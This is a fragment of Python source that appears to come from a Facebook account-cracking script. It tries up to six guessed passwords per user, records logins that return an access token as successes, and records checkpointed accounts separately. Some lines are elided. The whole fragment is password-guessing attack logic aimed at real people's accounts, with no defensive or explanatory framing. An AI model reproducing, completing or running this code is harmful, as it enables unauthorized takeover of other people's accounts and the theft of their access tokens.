	...
	def main(arg):
		...
		try:
			...
			if 'www.facebook.com' in k['error_msg']:
			    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps1+b['name'])
			    cps.append(user+ps1+name)
			else:
			    if 'access_token' in k:
			        print (G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps1+b['name'])
			        oks.append(user+ps1+name)
			    else:
			        ...
			        k=json.load(dt)
			        if 'www.facebook.com' in k['error_msg']:
			            print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps2+b['name'])
			            cps.append(user+ps2+name)
			        else:
			            if 'access_token' in k:
			                print(G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps2+b['name'])
			                oks.append(user+ps2+name)
			            else:
			                ...
			                k=json.load(dt)
			                if 'www.facebook.com' in k['error_msg']:
			                    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps3+b['name'])
			                    cps.append(user+ps3+name)
			                else:
			                    if 'access_token' in k:
			                        print(G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps3+b['name'])
			                        oks.append(user+ps3+name)
			                    else:
			                        ...
			                        k=json.load(dt)
			                        if 'www.facebook.com' in k['error_msg']:
			                            print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps4+b['name'])
			                            cps.append(user+ps4+name)
			                        else:
			                            if 'access_token' in k:
			                                print(G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps4+b['name'])
			                                oks.append(user+ps4+name)
			                            else:
			                                ...
			                                k=json.load(dt)
			                                if 'www.facebook.com' in k['error_msg']:
			                                    print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps5+b['name'])
			                                    cps.append(user+ps5+name)
			                                else:
			                                    if 'access_token' in k:
			                                        print(G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps5+b['name'])
			                                        oks.append(user+ps5+name)
			                                    else:
			                                        ...
			                                        k=json.load(dt)
			                                        if 'www.facebook.com' in k['error_msg']:
			                                            print(S+'[LOG IN AFTER 72HOURS] 》》》》 '+user+' 》》》》 '+ps6+b['name'])
			                                            cps.append(user+ps6+name)
			                                        else:
			                                            if 'access_token' in k:
			                                                print(G+'[LOG IN AFTER 3HOURS] 》》》》 '+user+' 》》》》 '+ps6+b['name'])
			                                                oks.append(user+ps6+name)
